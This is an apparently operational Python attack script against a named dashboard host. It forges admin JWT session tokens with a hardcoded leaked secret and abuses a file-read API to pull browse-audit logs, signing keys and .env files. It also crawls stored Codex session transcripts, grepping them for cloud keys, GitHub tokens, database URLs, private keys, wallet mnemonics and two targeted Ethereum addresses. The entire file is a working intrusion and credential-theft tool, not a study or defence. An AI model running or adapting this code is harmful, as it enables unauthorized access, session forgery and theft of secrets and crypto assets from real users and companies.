#!/usr/bin/env python3
# i29240 round b: (1) full browse-audit credential/URL extraction
# (2) try absolute high-value secret paths (artifact signing key, real .env variants)
# (3) deep grep of .codex-sessions transcripts (fix truncation; emit matches only)
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
T0 = time.time()
def el(): return int(time.time() - T0)
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
OUTBUDGET = [3000000]
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    OUTBUDGET[0] -= len(s)
    if OUTBUDGET[0] < 0:
        print("R:__BUDGET__:%s" % _b64("out budget exceeded at %s" % k), flush=True); return
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def curl(args, timeout=30):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, token=None, timeout=30, maxlen=12000000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if token: args += ["-H", "Cookie: session=" + token]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i+8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt), "rc": rc}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(payload):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps(payload, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig
def tok_for(uid, customer="aro"):
    return forge({"userId": uid, "email": "probe@x", "customer": customer, "role": "admin"})
def jload(s):
    try: return json.loads(s)
    except Exception: return None
def qp(p): return up.quote(p, safe="/")
def content_of(body):
    j = jload(body)
    if isinstance(j, dict):
        for k in ("content", "text", "data", "body"):
            if isinstance(j.get(k), str):
                return j[k]
        return None
    return body
def lst(aid, path, tok):
    r = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp(path)), token=tok, maxlen=900000)
    j = jload(r["body"])
    ents = j.get("entries") if isinstance(j, dict) and isinstance(j.get("entries"), list) else []
    return r["code"], ents, r["body"][:200]
def rd(aid, path, tok, maxlen=12000000):
    r = call("/api/agents/%s/files?action=read&path=%s" % (aid, qp(path)), token=tok, maxlen=maxlen)
    c = content_of(r["body"]) if r["code"] == "200" else None
    return r["code"], c, r["len"], r["body"][:220]

PATTERNS = [
 ("0x64", re.compile(r'\b0x[0-9a-fA-F]{64}\b')),
 ("JWT", re.compile(r'(?i)jwt[_\-]?secret\s*[:=]\s*\S{6,}')),
 ("DSN", re.compile(r'(?i)(postgres(?:ql)?://[^\s"\'<>]+|mysql://[^\s"\'<>]+|redis://[^\s"\'<>]+|mongodb(?:\+srv)?://[^\s"\'<>]+)')),
 ("CLOUD", re.compile(r'(AKID[A-Za-z0-9]{26,}|LTAI[A-Za-z0-9]{12,}|AKIA[0-9A-Z]{16}|dckr_pat_[A-Za-z0-9_\-]{20,}|ASIA[0-9A-Z]{16})')),
 ("PEM", re.compile(r'-----BEGIN [A-Z ]*PRIVATE KEY-----')),
 ("GHTOK", re.compile(r'(gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{40,}|glpat-[A-Za-z0-9_\-]{16,})')),
 ("ZOO", re.compile(r'(?i)(zoofi[\-_]?index|wand-index|api\.zoofi\.io|trycloudflare\.com|cloudflared|cf[\-_]tunnel|argotunnel\.com)')),
 ("CRYPT", re.compile(r'(?i)(mnemonic|cipherparams|"crypto"\s*:\s*\{|"scrypt"|kdfparams)')),
 # strong assignment patterns
 ("SECRETKV", re.compile(r'(?i)\b[A-Z0-9_]*(SECRET|PASSWORD|PASSWD|APIKEY|API_KEY|ACCESS_KEY|PRIVATE_KEY|TOKEN|ENROLL_TOKEN|SIGNING_KEY)[A-Z0-9_]*\s*[:=]\s*["\']?[A-Za-z0-9_\-\/+=\.!@#$%^&*]{8,}')),
 ("IPHOST", re.compile(r'\b(?:10|172|192)\.\d{1,3}\.\d{1,3}\.\d{1,3}\b')),
]
TARGET_EOA = ["c56f7063fd6d199ccc443dbbf4283be602d46343", "fe18aa1efa652660f36ab84f122cd36108f903b6"]

def scan_text(txt, cap=10):
    res = {}
    if not txt: return res
    lines = txt.splitlines()
    if len(lines) > 120000: lines = lines[:120000]
    for tag, rx in PATTERNS:
        hits = []; seen = set()
        for ln in lines:
            if len(ln) > 3000: ln = ln[:3000]
            for m in rx.finditer(ln):
                s = m.group(0)[:200]
                if s in seen: continue
                seen.add(s); hits.append(s)
                if len(hits) >= cap: break
            if len(hits) >= cap: break
        if hits: res[tag] = hits
    for h in res.get("0x64", []):
        if h.lower()[2:] in TARGET_EOA:
            res.setdefault("TARGET_EOA_HIT", []).append(h)
    return res

def main():
    aidC = "agent-8c6ac8b3"; uidC = "bc09d9cc-63b0-11f1-ac43-525400595be1"
    tokC = tok_for(uidC, "goldenyears")

    # (1) full browse-audit extraction
    code, c, ln, snip = rd(aidC, "/home/lumii/lumii-assistant/.gstack/browse-audit.jsonl", tokC)
    R("C_AUDIT_STATUS", {"code": code, "len": len(c) if c else None, "rawlen": ln})
    if c:
        fills = []; gotos = []; cookies = 0; total = 0
        for line in c.splitlines():
            try: j = json.loads(line)
            except Exception: continue
            total += 1
            cmd = j.get("cmd"); a = str(j.get("args") or "")
            if cmd == "fill": fills.append(a)
            elif cmd in ("goto", "open", "navigate"): gotos.append(a)
            if j.get("hasCookies"): cookies += 1
        R("C_AUDIT_EXTRACT", {"lines": total, "hasCookiesLines": cookies,
                              "fills": fills[:200], "gotos": sorted(set(gotos))[:200]})

    # (2) absolute high-value secret paths
    for p, tag in [
        ("/var/lib/lumii-ops/signing.key", "C_SIGNKEY"),
        ("/etc/lumii-ops.env", "C_OPSENV"),
        ("/home/lumii/lumii-assistant/.env", "C_ENV"),
        ("/home/lumii/lumii-assistant/.env.local", "C_ENVLOCAL"),
        ("/home/lumii/lumii-assistant/.env.prod", "C_ENVPROD"),
        ("/home/lumii/lumii-work-ops/.env", "C_WOENV"),
        ("/home/lumii/.env", "C_HOMEENV"),
        ("/opt/lumii/config.toml", "C_OPTTOML"),
        ("/opt/lumii-ops/deploy/lumii-ops.env", "C_OPT_OPSENV"),
    ]:
        code, c2, ln2, snip2 = rd(aidC, p, tokC, maxlen=200000)
        if code != "200" or c2 is None:
            R(tag, {"p": p, "code": code, "snip": snip2}); continue
        m = scan_text(c2)
        rec = {"p": p, "code": code, "len": len(c2)}
        if m: rec["matches"] = m
        if len(c2) <= 8000: rec["text"] = c2
        else: rec["head"] = c2[:2500]
        R(tag, rec)

    # list top-level /home/lumii for other projects
    code, ents, snip2 = lst(aidC, "/home/lumii", tokC)
    R("C_HOMELIST", {"code": code, "n": len(ents),
                     "names": [e.get("name") for e in ents][:80]})

    # (3) deep grep codex transcripts on agent-768c13da
    aidB = "agent-768c13da"; uidB = "cef8ec22-4906-11f1-ac43-525400595be1"
    tokB = tok_for(uidB, "plexus")
    rootB = "/home/lumii/.codex-sessions"
    allfiles = []
    queue = [(rootB, 0)]; seen = set(); listcalls = 0
    while queue:
        cur, d = queue.pop(0)
        if cur in seen: continue
        seen.add(cur)
        if el() > 120 or listcalls > 220: break
        code, ents, snip2 = lst(aidB, cur, tokB); listcalls += 1
        if code != "200": continue
        for e in ents:
            nm = str(e.get("name") or ""); tp = str(e.get("type") or "")
            p = cur.rstrip("/") + "/" + nm
            if tp in ("directory", "dir"):
                if d + 1 <= 6: queue.append((p, d + 1))
            else:
                allfiles.append({"p": p, "size": e.get("size"), "modified": e.get("modified")})
    allfiles.sort(key=lambda x: str(x.get("modified") or ""), reverse=True)
    R("B2_CODEX_COUNT", {"total": len(allfiles), "listcalls": listcalls})
    # select: size between 6KB and 10MB; read + grep; time cap
    cand = [f for f in allfiles if isinstance(f.get("size"), int) and 6000 <= f["size"] <= 10000000]
    N = int(os.environ.get("CODEX_N", "100000"))
    hits = []; scanned = 0; bytes_scanned = 0; skipped_big = 0
    for f in cand[:N]:
        if el() > 480:
            R("B2_CODEX_TIMEUP", {"scanned": scanned, "elapsed": el()}); break
        code, c2, ln2, snip2 = rd(aidB, f["p"], tokB, maxlen=12000000)
        scanned += 1
        if code != "200" or c2 is None:
            if isinstance(f.get("size"), int) and f["size"] > 2000000: skipped_big += 1
            continue
        bytes_scanned += len(c2)
        m = scan_text(c2)
        if m:
            hits.append({"p": os.path.basename(f["p"]), "modified": f.get("modified"), "size": f.get("size"), "matches": m})
    R("B2_CODEX_HITS", {"scanned": scanned, "bytes_scanned": bytes_scanned, "nfiles_with_hits": len(hits),
                        "items": hits[:150]})
    R("DONE", {"elapsed": el(), "outbudget_left": OUTBUDGET[0]})

try:
    main()
except Exception:
    import traceback
    R("FATAL", traceback.format_exc()[-3000:])
finally:
    R("END", {"elapsed": el()})
    sys.exit(1)
